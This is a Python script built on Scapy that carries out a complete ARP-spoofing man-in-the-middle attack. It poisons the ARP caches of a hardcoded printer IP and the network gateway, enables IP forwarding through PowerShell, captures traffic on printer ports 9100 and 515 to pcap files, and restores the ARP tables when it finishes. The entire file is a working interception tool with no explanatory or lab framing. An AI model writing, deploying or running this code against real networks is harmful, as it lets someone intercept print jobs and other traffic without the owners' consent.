import scapy.all as scapy
from scapy.utils import PcapWriter
import threading
import time
import os
import sys
import subprocess

TARGET_IP = "10.72.61.252"
PRINTER_PORTS = [9100, 515]
BASE_OUTPUT_DIR = r'C:\Users\User\Downloads\Network_Project'
INTERFACE = scapy.conf.iface.name
GATEWAY_IP = scapy.conf.route.route("0.0.0.0")[2]

stop_event = threading.Event()
MY_MAC = scapy.get_if_hwaddr(INTERFACE)

def resolve_mac(ip):
    try:
        ans, _ = scapy.srp(
            scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), 
            timeout=2, 
            retry=2, 
            verbose=False
        )
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return None

def toggle_ip_forwarding(enable=True):
    state = "Enabled" if enable else "Disabled"
    try:
        cmd = f"Set-NetIPInterface -Forwarding {state}"
        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    except Exception:
        pass

class NetworkSniffer:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.output_path = os.path.join(BASE_OUTPUT_DIR, f"Device_{target_ip}")
        os.makedirs(self.output_path, exist_ok=True)
        
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        self.filename = os.path.join(self.output_path, f"capture_{timestamp}.pcap")
        self.writer = PcapWriter(self.filename, append=True, sync=True)

    def process_packet(self, pkt):
        if scapy.IP in pkt and scapy.TCP in pkt:
            if pkt.src == MY_MAC:
                return

            tcp = pkt[scapy.TCP]
            if tcp.dport in PRINTER_PORTS or tcp.sport in PRINTER_PORTS:
                if pkt[scapy.IP].src == self.target_ip or pkt[scapy.IP].dst == self.target_ip:
                    self.writer.write(pkt)

    def start_sniffing(self):
        scapy.sniff(
            iface=INTERFACE,
            prn=self.process_packet,
            store=False,
            stop_filter=lambda x: stop_event.is_set()
        )
        self.writer.close()

def arp_spoof(target_ip, gateway_ip):
    target_mac = resolve_mac(target_ip)
    gateway_mac = resolve_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        stop_event.set()
        return

    p1 = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    p2 = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

    while not stop_event.is_set():
        try:
            scapy.sendp(p1, verbose=False)
            scapy.sendp(p2, verbose=False)
            time.sleep(2)
        except Exception:
            break

def restore_network(target_ip, gateway_ip):
    t_mac = resolve_mac(target_ip)
    g_mac = resolve_mac(gateway_ip)
    
    if t_mac and g_mac:
        res_t = scapy.Ether(dst=t_mac)/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=t_mac, hwsrc=g_mac)
        res_g = scapy.Ether(dst=g_mac)/scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=g_mac, hwsrc=t_mac)
        scapy.sendp([res_t, res_g], count=5, verbose=False)

def main():
    toggle_ip_forwarding(enable=True)
    sniffer = NetworkSniffer(TARGET_IP)
    
    threads = [
        threading.Thread(target=sniffer.start_sniffing, daemon=True),
        threading.Thread(target=arp_spoof, args=(TARGET_IP, GATEWAY_IP), daemon=True)
    ]

    for t in threads:
        t.start()

    try:
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        restore_network(TARGET_IP, GATEWAY_IP)
        toggle_ip_forwarding(enable=False)

if __name__ == "__main__":
    main()